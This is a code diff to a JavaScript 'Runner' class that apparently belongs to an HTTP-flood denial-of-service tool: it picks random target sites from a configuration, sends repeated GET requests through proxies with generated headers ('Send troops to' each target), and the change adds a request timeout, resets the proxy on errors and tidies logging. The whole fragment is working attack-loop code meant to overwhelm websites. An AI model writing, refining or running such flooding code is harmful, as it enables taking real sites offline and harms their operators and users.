@@ -35,7 +35,6 @@ class Runner {
   }
 
 	updateConfiguration (config) {
-		console.debug('Update config for worker...')
     this.sites = config.sites
     this.proxies = config.proxies
   }
@@ -45,8 +44,6 @@ class Runner {
 			site: this.sites[getRandomInt(this.sites.length)],
       proxy: this.proxies
     };
-		
-		console.debug('Send troops to', target.site.page)
 
 		for (let attackIndex = 0; (attackIndex < this.ATTACKS_PER_TARGET); attackIndex++) {
 			if (!this.active) {
@@ -56,6 +53,7 @@ class Runner {
 			try {
 				await this.attack(target);
 			} catch(e) {
+				this.proxy = null;
 				this.handleError(e, target);
 				break;
 			}
@@ -70,6 +68,7 @@ class Runner {
 
 		const r = await axios.get(target.site.page, {
 			headers: generateRequestHeaders(),
+			timeout: 10000,
 			validateStatus: () => true,
 			proxy: proxyObj
 		});
@@ -91,7 +90,7 @@ class Runner {
 			console.error(e)
 		}
 
-		this.eventSource.emit('error', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
+		this.eventSource.emit('err', { type: 'attack', url: target.site.page, log: `${target.site.page} | ${code}` })
 	}
 }
 
